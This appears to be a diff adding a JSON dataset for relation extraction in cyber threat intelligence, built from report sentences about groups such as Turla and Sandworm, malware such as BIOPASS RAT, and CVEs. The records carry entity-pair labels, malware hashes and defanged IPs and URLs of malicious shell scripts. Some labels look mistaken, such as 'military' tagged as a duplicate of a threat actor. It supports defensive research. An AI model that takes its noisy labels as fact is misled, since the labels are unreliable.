@@ -1,0 +1,1143 @@
+[
+  {
+    "marked_text":"[E1] Turla [\/E1], a group TAG attributes to [E2] Russia FSB [\/E2], continues to run campaigns against the Baltics, targeting defense and cybersecurity organizations in the region.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"attributed-to",
+    "label":0
+  },
+  {
+    "marked_text":"While the [E1] Cyclops Blink [\/E1] malware variant that we analyzed in this report is complicated in nature, one thing proves to be unmistakable when it comes to the [E2] Sandworm [\/E2] group that created it: Sandworm is a persistent and sophisticated group whose motives are clearly at odds with those that would be expected from groups that are primarily financially motivated.",
+    "head_type":"malware",
+    "tail_type":"threat-actor",
+    "relation":"attributed-to",
+    "label":0
+  },
+  {
+    "marked_text":"  The [E2] Sandworm [\/E2] APT group has been attributed as creating both Cyclops Blink and the [E1] VPNFilter [\/E1] internet of things (IoT) botnet.",
+    "head_type":"malware",
+    "tail_type":"threat-actor",
+    "relation":"attributed-to",
+    "label":0
+  },
+  {
+    "marked_text":"One of the RTF files was found in a server related to [E2] Confucius [\/E2] (f1a54dca2fdfe59ec3f537148460364fb5d046c9b4e7db5fc819a9732ae0e063, detected as TROJ_CVE201711882.AG), while the other one (434d34c0502910c562f5c6840694737a2c82a8c44004fa58c7c457b08aac17bd,detected as [E1] Mal_CVE20170199-2 [\/E1]) downloaded a VB Backdoor that pings back to twitck[.]com, a domain name belonging to Urpage.",
+    "head_type":"malware",
+    "tail_type":"threat-actor",
+    "relation":"authored-by",
+    "label":1
+  },
+  {
+    "marked_text":"After analyzing the ChiserClient, we found that it shares a similar style of network configuration to the [E1] TClient [\/E1] mentioned in our previous research on [E2] Earth Centaur. [\/E2]",
+    "head_type":"malware",
+    "tail_type":"threat-actor",
+    "relation":"authored-by",
+    "label":1
+  },
+  {
+    "marked_text":" During the analysis of the [E1] MicroBackdoor [\/E1] sample, Unit 42 observed the configuration and found an embedded IP address, belonging to a threat actor we believe is potentially the developer: [E2] x4k [\/E2], also known as L4ckyguy, unKn0wn, unk0w, _unkn0wn and x4kme.",
+    "head_type":"malware",
+    "tail_type":"threat-actor",
+    "relation":"authored-by",
+    "label":1
+  },
+  {
+    "marked_text":"Stage1.exe purports to be ransomware, as it overwrites the target\u2019s master boot record with 512 bytes and upon reboot displays the following ransom note:  [E1] Stage2.exe [\/E1] is a beaconing implant that performs an HTTPS connection to download a JPG file hosted on [E2] Discord\u2019s content delivery network (CDN) [\/E2].",
+    "head_type":"FILEPATH",
+    "tail_type":"Infrastucture",
+    "relation":"beacons-to",
+    "label":3
+  },
+  {
+    "marked_text":"One of the RTF files was found in a server related to Confucius (f1a54dca2fdfe59ec3f537148460364fb5d046c9b4e7db5fc819a9732ae0e063, detected as TROJ_CVE201711882.AG), while the other one (434d34c0502910c562f5c6840694737a2c82a8c44004fa58c7c457b08aac17bd,detected as [E1] Mal_CVE20170199-2 [\/E1]) downloaded a VB Backdoor that pings back to [E2] twitck[.]com [\/E2], a domain name belonging to Urpage.",
+    "head_type":"malware",
+    "tail_type":"url",
+    "relation":"beacons-to",
+    "label":3
+  },
+  {
+    "marked_text":"If the victim enters the credential in the fake form and clicks anywhere on the page, the [E1] script [\/E1] will take the credentials, encode them using base64, replace some characters with custom substrings, and then upload these to [E2] Water Pamola\u2019s server [\/E2].       Figure 4.",
+    "head_type":"malware",
+    "tail_type":"Infrastucture",
+    "relation":"communicates-with",
+    "label":4
+  },
+  {
+    "marked_text":" All of the [E1] Sysget files [\/E1] used in this campaign communicate with a single [E2] command and control (C2) server, [\/E2] hosted at biosnews[.]info.",
+    "head_type":"malware",
+    "tail_type":"Infrastucture",
+    "relation":"communicates-with",
+    "label":4
+  },
+  {
+    "marked_text":"The signature triggered on the creation of the webshell files, of which we observed the following file written:  \/usr\/local\/tomcat\/work\/Catalina\/localhost\/ROOT\/org\/apache\/jsp\/shell_jsp.java [E2] \/usr\/local\/tomcat\/webapps\/ROOT\/shell_.jsp [\/E2]  [E1] SpringShell [\/E1] is officially assigned CVE-2022-22965, and the patch was released on March 31, 2022.",
+    "head_type":"vulnerability",
+    "tail_type":"FILEPATH",
+    "relation":"consists-of",
+    "label":6
+  },
+  {
+    "marked_text":"Detecting and deleting Mimikatz      We observed the PowerShell script disabling the security products by leveraging [E2] aswarpot.sys [\/E2] (a legitimate [E1] Avast Anti-Rootkit Driver [\/E1]).",
+    "head_type":"SOFTWARE",
+    "tail_type":"FILEPATH",
+    "relation":"consists-of",
+    "label":6
+  },
+  {
+    "marked_text":"We also observed that [E2] Mailto [\/E2] (AKA NetWalker) tends to deliver ransomware in a [E1] highly obfuscated PowerShell script [\/E1].",
+    "head_type":"attack-pattern",
+    "tail_type":"malware",
+    "relation":"delivers",
+    "label":8
+  },
+  {
+    "marked_text":"We took a look at one of the samples captured from [E1] Capesand [\/E1] that was used to deploy the [E2] njRat [\/E2] malware \u2013 notably its main executable NotepadEx.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"delivers",
+    "label":8
+  },
+  {
+    "marked_text":"The tools transferred using [E1] AnyDesk [\/E1] are:  Netscan: To scan for other endpoints Nmap (log4shell.nse): To scan for Log4shell vulnerable endpoints Hacking tools [E2] Mimikatz [\/E2] and Impacket: For lateral movement PDQ deploy: For mass deployment of malicious script to multiple endpoints Aswarpot.sys: For disabling defense solutions.",
+    "head_type":"tools",
+    "tail_type":"tools",
+    "relation":"downloads",
+    "label":9
+  },
+  {
+    "marked_text":"The tools transferred using [E1] AnyDesk [\/E1] are:  Netscan: To scan for other endpoints Nmap (log4shell.nse): To scan for Log4shell vulnerable endpoints Hacking tools Mimikatz and Impacket: For lateral movement [E2] PDQ deploy [\/E2]: For mass deployment of malicious script to multiple endpoints Aswarpot.sys: For disabling defense solutions.",
+    "head_type":"tools",
+    "tail_type":"tools",
+    "relation":"downloads",
+    "label":9
+  },
+  {
+    "marked_text":"The tools transferred using [E1] AnyDesk [\/E1] are:  Netscan: To scan for other endpoints [E2] Nmap [\/E2] (log4shell.nse): To scan for Log4shell vulnerable endpoints Hacking tools Mimikatz and Impacket: For lateral movement PDQ deploy: For mass deployment of malicious script to multiple endpoints Aswarpot.sys: For disabling defense solutions.",
+    "head_type":"tools",
+    "tail_type":"tools",
+    "relation":"downloads",
+    "label":9
+  },
+  {
+    "marked_text":"We assess that these campaigns delivered [E1] ALIEN [\/E1], a simple Android malware in charge of loading [E2] PREDATOR [\/E2], an Android implant described by CitizenLab in December 2021.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"drops",
+    "label":10
+  },
+  {
+    "marked_text":" [E1] Backdoor.Win64.BIOPASS.A [\/E1]  0f18694b400e14eb995003541f16f75a5afc2478cc415a6295d171ba93565a82  flash_installer.exe  [E2] BIOPASS RAT [\/E2] Loader  Backdoor.Win64.BIOPASS.A  11b785e77cbfa2d3849575cdfabd85d41bae3f2e0d33a77e7e2c46a45732d6e4  System.exe",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor ([E1] Quasar remote administration tool [\/E1] aka [E2] Quasar RAT [\/E2]) were deployed on the compromised machine.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4  Silverlight1.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31 [\/E2]  [E1] test.exe [\/E1]  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c  Silverlight_ins.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999  Silverlight_ins.exe  ",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  69d930050b2445937ec6a4f9887296928bf663f7a71132676be3f112e80fe275  test.exe  ",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"test3.exe  [E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  344cdbc2a7e0908cb6638bc7b81b6b697b32755bad3bed09c511866eff3876c7",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  8445c0189735766edf0e3d01b91f6f98563fef272ac5c92d3701a1174ad072dd  Silverlight_ins.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E1] 89c0b2036ce8d1d91f6d8b8171219aafcd6237c811770fa16edf922cedfecc54 [\/E1]  [E2] MTYwOTI1MzEzNQ==.exe [\/E2]  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"hash",
+    "tail_type":"FILEPATH",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c11906210465045a54a5de1053ce0624308a8c7b342bb707a24e534ca662dc89  test-flash.exe  BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  [E1] c3fa69e15a63b151f8d1dc3018284e153ad2eb672d54555eaeaac79396b64e3b [\/E1]  [E2] test.exe [\/E2]  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5  flashplayerpp_install_cn.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c8542bffc7a2074b8d84c4de5f18e3c8ced30b1f6edc13047ce99794b388285c  flash2.exe  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"hash",
+    "tail_type":"FILEPATH",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"This post is also available in:      \u65e5\u672c\u8a9e (Japanese)  LockBit 2.0 is ransomware as a service (RaaS) that first emerged in June 2021 as an upgrade to its predecessor [E2] LockBit [\/E2] (aka [E1] ABCD Ransomware [\/E1]), which was first observed in September 2019.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  5fd2da648068f75a4a66b08d6d93793f735be62ae88085a79d839b6a0d6d859a  flash1.exe  [E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  660cef8210f823acb0b31d78fbce1d6f3f8c4f43231286f7ac69f75b2c42c020  flashplayerpp_install_cn.exe",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  fa1d70b6b5b1a5e478c7d9d840aae0cc23d80476d9eea884a73d1b7e3926a209  64.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  fa7fbca583b22d92ae6d832d90ee637cc6ac840203cd059c6582298beb955aee  test.exe  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":" [E1] 8b5d4840bbdce0798950cd5584e3d4564581a7698bc6cfb2892c97b826129cec [\/E1]  [E2] Silverlight_ins.exe [\/E2]",
+    "head_type":"hash",
+    "tail_type":"FILEPATH",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] .Python.BIOPASS.A [\/E1]  34be85754a84cc44e5bb752ee3a95e2832e7be1f611dd99e9a1233c812a6dad2  c1222.txt  [E2] BIOPASS RAT [\/E2] Python Script (C1222 module)  Trojan",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9eed9a2e0edf38f6354f4e57b3a6b9bed5b19263f54bcee19e66fc8af0c29e4e  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] 9f34d28562e7e1e3721bbf679c58aa8f5898995ed999a641f26de120f3a42cf4 [\/E2]  [E1] Silverlight1.exe [\/E1]  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  9ff906ffcde32e4c6fb3ea4652e6d6326713a7fde8bb783b52f12a1f382f8798  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  a7c4dac7176e291bd2aba860e1aa301fb5f7d880794f493f2dea0982e2b7eb31  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b48e01ff816f12125f9f4cfc9180d534c7c57ef4ee50c0ebbe445e88d4ade939  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b82bde3fe5ee900a76ac27b4869ed9aa0802c63bbd72b3bfb0f1abce6340cc6c  Silverlight_ins.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  b9d0838be8952ebd4218c8f548ce94901f789ec1e32f5eaf46733f0c94c77999  Silverlight_ins.exe  ",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":".Python.BIOPASS.A  [E2] f21decb19da8d8c07066a78839ffd8af6721b1f4323f10a1df030325a1a5e159 [\/E2]  [E1] cdaemon.txt [\/E1]  BIOPASS RAT Python Script (Cdaemon module)",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] 7f4e02a041ca7cfbdc79b96a890822fd7c37be67b1f6c9e07596e6aec57ccdc0 [\/E2]  [E1] Silverlight.exe [\/E1]",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"That being said, when looking at the HTML source code of the site, we discovered a couple of references to the user observed before \u2013 [E1] x4kme [\/E1] \u2013 and other aliases such as [E2] uKn0wn [\/E2], which was observed in the HelloXD ransomware samples.",
+    "head_type":"identity",
+    "tail_type":"identity",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Recently observed IPs used in Curious Gorge campaigns: [E2] COLDRIVER [\/E2], a Russian-based threat actor sometimes referred to as [E1] Calisto [\/E1], has launched credential phishing campaigns, targeting several US based NGOs and think tanks, the military of a Balkans country, and a Ukraine based defense contractor.",
+    "head_type":"threat-actor",
+    "tail_type":"threat-actor",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] c11906210465045a54a5de1053ce0624308a8c7b342bb707a24e534ca662dc89 [\/E2]  [E1] test-flash.exe [\/E1]  BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  c3fa69e15a63b151f8d1dc3018284e153ad2eb672d54555eaeaac79396b64e3b  test.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5  flashplayerpp_install_cn.exe  BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  c8542bffc7a2074b8d84c4de5f18e3c8ced30b1f6edc13047ce99794b388285c  flash2.exe  BIOPASS RAT Loader  Backdoor.",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  7d0d7d416db5bd7201420982987e213a129eef2314193e4558a24f3c9a91a38e  flash_installer.exe  ",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Recently observed IPs used in Curious Gorge campaigns: COLDRIVER, a Russian-based threat actor sometimes referred to as [E1] Calisto [\/E1], has launched credential phishing campaigns, targeting several US based NGOs and think tanks, the [E2] military  [\/E2]of a Balkans country, and a Ukraine based defense contractor.",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] 75e03f40a088903579a436c0d8e8bc3d0d71cf2942ad793cc948f36866a2e1ad [\/E2]  [E1] silverlight_ins.exe [\/E1]  ",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  bd8dc7e3909f6663c0fff653d7afbca2b89f2e9bc6f27adaab27f640ccf52975  Silverlight.exe  ",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Earth Baku deploys its ongoing campaign, which can be traced to as far back as July 2020, through multiple attack vectors that are designed based on different exploits or the infrastructure of its targeted victim's environment:  \u2022 SQL injection to upload a malicious file \u2022 Installment through\u202fInstallUtil.exe in a\u202fscheduled task \u2022 Possibly a malicious link (LNK) file sent as an email attachment \u2022 Exploitation\u202fof\u202fthe [E1] ProxyLogon [\/E1] vulnerability [E2] CVE-2021-26855 [\/E2] to upload a China Chopper web shell  This campaign uses previously unidentified shellcode loaders, which we have named StealthVector and StealthMutant, and a backdoor, which we have dubbed ScrambleCross.",
+    "head_type":"vulnerability",
+    "tail_type":"vulnerability",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Indicators of Compromise (IoCs)      SHA256  Filename  Note  Analysis  84fbf74896d2a1b62d73b9a5d0be2f627d522fc811fe08044e5485492d2d4249  big.txt  BIOPASS RAT Python Script (Version 3)  TrojanSpy.Python.BIOPASS.A  [E2] f3c96145c9d6972df265e12accfcd1588cee8af1b67093011e31b44d0200871f [\/E2]  [E1] c1222.txt [\/E1]  BIOPASS RAT Python Script (C1222 module)  Trojan.Python.BIOPASS.A  0f8a87ca5f94949904804442c1a0651f99ba17ecf989f46a3b2fde8de455c4a4  c1222.txt  BIOPASS RAT Python Script (C1222 module)  Trojan.Python.BIOPASS.A  d8b1c4ad8f31c735c51cb24e9f767649f78ef5c571769fbaac9891c899c33444  c1222.txt  BIOPASS RAT Python Script (C1222 module)  ",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"   CVE-2021-26855: Microsoft Exchange Server Remote Code Execution Vulnerability (pre-authenticated Server-Side Request Forgery [SSRF]) [E2] CVE-2021-27065 [\/E2]: [E1] Microsoft Exchange Server Remote Code Execution Vulnerability [\/E1] (post-authenticated Arbitrary File Write)         Fig - MS Exchange Client Access Protocol Architecture     The Client Access services (Outlook Web App portal) proxies the incoming connections to the Backend services.",
+    "head_type":"vulnerability",
+    "tail_type":"vulnerability",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  Backdoor.Win64.BIOPASS.A  [E2] 3e8f8b8a5f70c195a2e4d4fc7f80523809f6dbf9ead061ce8ef04fb489a577cf [\/E2]  [E1] test-flash.exe [\/E1]  BIOPASS RAT Loader  Backdoor.Win32.BIOPASS.A  5d7aa3474e734913ecb4b820c0c546c92f7684081c519eecd3990e11a19bf2ba  flash_installer.exe  ",
+    "head_type":"FILEPATH",
+    "tail_type":"hash",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"[E1] BIOPASS RAT [\/E1] Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  ba44c22a3224c3a201202b69d86df2a78f0cd1d4ac1119eb29cae33f09027a9a  Silverlight2.exe",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"duplicate-of",
+    "label":11
+  },
+  {
+    "marked_text":"Base64 encoded ANEL downloaded by Koadic [E1] ANEL [\/E1] will send the infected environment\u2019s information to the [E2] C&C server [\/E2].",
+    "head_type":"malware",
+    "tail_type":"Infrastucture",
+    "relation":"exfiltrates-to",
+    "label":12
+  },
+  {
+    "marked_text":"Consistent with CERT-UA reporting, TAG observed multiple Russian GRU actors - APT28 and [E1] Sandworm [\/E1] - conduct campaigns exploiting the [E2] Follina vulnerability [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"vulnerability",
+    "relation":"exploits",
+    "label":13
+  },
+  {
+    "marked_text":" The [E1] WanaCrypt0r [\/E1] ransomware spreads itself by heavily scanning over TCP port 445 (associated with SMB) and attempting to exploit the [E2] ETERNALBLUE [\/E2] vulnerability on systems.",
+    "head_type":"malware",
+    "tail_type":"vulnerability",
+    "relation":"exploits",
+    "label":13
+  },
+  {
+    "marked_text":"Consistent with CERT-UA reporting, TAG observed multiple Russian GRU actors - APT28 and [E1] Sandworm [\/E1] - conduct campaigns exploiting the [E2] Follina vulnerability [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"vulnerability",
+    "relation":"exploits",
+    "label":13
+  },
+  {
+    "marked_text":" K23605346: BIG-IP iControl REST vulnerability CVE-2022-1388 [E1] EnemyBot [\/E1] Attempts to Exploit [E2] CVE-2022-1388 [\/E2]  30f7e1998d162dfad69d6d8abb763ae4033bbd4a015d170b1ad3e20d39cd4e20 da647646cd36a3acb716b4266e9032f9c1caf555b7667e1dbe5bef89e7d2fdbb b39d2a1202351d3be5d9906ec47ee05c305302124dddec5538dc7b9924c6b85d ad6d44c70f83431bedf890967f2da0607c9b1f79591fb1b2697160f5b1c1a75c 1f93a6696f7bf1b2067cc503583deb4840404ebeeba89579bd303f57000baeb7 9a72aab2a3d1d6e66c185966597a52a8726ca25f5d9e2195af44f98d8b1847d5 53214f4d2d2dfd02b46f416cbdcb6f3a764820a50da4d59926f829b96cf82a6c  20.187.67[.]224 192.132.218[.]149 85.203.23[.]73 116.48.110[.]159  hxxps:\/\/transfer[.]sh\/dlxo3I\/1.sh hxxp:\/\/20.239.193[.]47\/kele.sh hxxp:\/\/20.239.193[.]47\/kele1 hxxp:\/\/20.187.86[.]47\/dadda  Updated May 16, 2022  Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!",
+    "head_type":"malware",
+    "tail_type":"vulnerability",
+    "relation":"exploits",
+    "label":13
+  },
+  {
+    "marked_text":"On February 10, Threat Analysis Group discovered two distinct [E1] North Korean government-backed attacker groups [\/E1] exploiting a remote code execution vulnerability in Chrome, [E2] CVE-2022-0609 [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"vulnerability",
+    "relation":"exploits",
+    "label":13
+  },
+  {
+    "marked_text":"They can be used to compromise an endpoint in the following way:  This functionality was leveraged in exploitation of [E2] CVE-2017-0199 [\/E2] - a Microsoft Office\/[E1] WordPad [\/E1] remote code execution (RCE) vulnerability patched by Microsoft in September 2017, and was used in multiple campaigns, like this OilRig campaign.",
+    "head_type":"tools",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"While still not seen in the wild, similar exploits in [E1] Microsoft Equation Editor [\/E1], such as such as [E2] CVE-2018-0807 [\/E2] and CVE-2018-0798, were identified by Unit 42 researchers.",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"This post is also available in:      \u65e5\u672c\u8a9e (Japanese)  On Aug. 25, 2021, Atlassian released a security advisory for an injection vulnerability in [E1] Confluence Server and Data Center [\/E1], [E2] CVE-2021-26084 [\/E2].",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"Workload Security uses advanced security controls such as intrusion prevention system (IPS), deep packet inspection (DPI), and integrity monitoring to protect [E1] Exchange Servers [\/E1] from attackers that could exploit [E2] ProxyLogon [\/E2].",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"According to Shodan, on March 4, there were more than 266,000 [E1] Exchange Servers [\/E1] vulnerable to the [E2] ProxyLogon vulnerability [\/E2], a day after the patch was released.",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"After analysis of the compromise, Volexity determined the initial foothold was the result of a [E2] remote code execution vulnerability [\/E2] in [E1] Confluence Server and Data Center [\/E1].",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"For example, TAG discovered campaigns targeting Armenian users which utilized [E2] zero-day vulnerabilities [\/E2] in Chrome and [E1] Internet Explorer [\/E1].",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":" [E2] CVE-2022-22960 [\/E2] is a privilege escalation vulnerability in [E1] VMware Workspace ONE Access, Identity Manager and vRealize Automation [\/E1] instances, due to improper permissions in support scripts.",
+    "head_type":"SOFTWARE",
+    "tail_type":"vulnerability",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"The exploit chain combined an RCE in [E2] WebKit [\/E2] exploiting [E1] CVE-2021-1789 [\/E1] which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021.",
+    "head_type":"vulnerability",
+    "tail_type":"SOFTWARE",
+    "relation":"has",
+    "label":14
+  },
+  {
+    "marked_text":"In this case, the Android app name was [E2] stopwar.apk [\/E2] (com.ddos.stopwar) and was distributed from the website [E1] stopwar.pro [\/E1].",
+    "head_type":"url",
+    "tail_type":"malware",
+    "relation":"hosts",
+    "label":15
+  },
+  {
+    "marked_text":"Here is a deeper look at some campaign activity TAG has observed since our last update: [E1] Turla [\/E1], a group publicly attributed to Russia\u2019s Federal Security Service (FSB), recently hosted Android apps on a domain spoofing the [E2] Ukrainian Azov Regiment [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"identity",
+    "relation":"impersonates",
+    "label":16
+  },
+  {
+    "marked_text":"Indicators of Compromise (IoCs)      SHA256  Filename  Note  Analysis  84fbf74896d2a1b62d73b9a5d0be2f627d522fc811fe08044e5485492d2d4249  big.txt  BIOPASS RAT Python Script (Version 3)  TrojanSpy.Python.BIOPASS.A  [E1] f3c96145c9d6972df265e12accfcd1588cee8af1b67093011e31b44d0200871f [\/E1]  c1222.txt  [E2] BIOPASS RAT [\/E2] Python Script (C1222 module)  Trojan.Python.BIOPASS.A  0f8a87ca5f94949904804442c1a0651f99ba17ecf989f46a3b2fde8de455c4a4  c1222.txt  BIOPASS RAT Python Script (C1222 module)  Trojan.Python.BIOPASS.A  d8b1c4ad8f31c735c51cb24e9f767649f78ef5c571769fbaac9891c899c33444  c1222.txt  BIOPASS RAT Python Script (C1222 module)  ",
+    "head_type":"hash",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  7d0d7d416db5bd7201420982987e213a129eef2314193e4558a24f3c9a91a38e  [E1] flash_installer.exe [\/E1]  ",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"BIOPASS RAT Loader  [E2] Backdoor.Win64.BIOPASS.A [\/E2]  36e3fcd6a4c7c9db985be77ea6394b2ed019332fdae4739df2f96a541ea52617  [E1] Silverlight.exe [\/E1]",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"After infection, [E2] Virlock [\/E2] hides the file extension through modification of the registry ([E1] HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\HideFileExt [\/E1] = 1, HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden = 2).",
+    "head_type":"REGISTRYKEY",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
+    "marked_text":"[E1] test4.exe [\/E1]  BIOPASS RAT Loader  [E2] Backdoor.Win32.BIOPASS.A [\/E2]  3589e53c59d9807cca709387bbcaaffc7e24e15d9a78425b717fc55c779b928e",
+    "head_type":"FILEPATH",
+    "tail_type":"malware",
+    "relation":"indicates",
+    "label":17
+  },
+  {
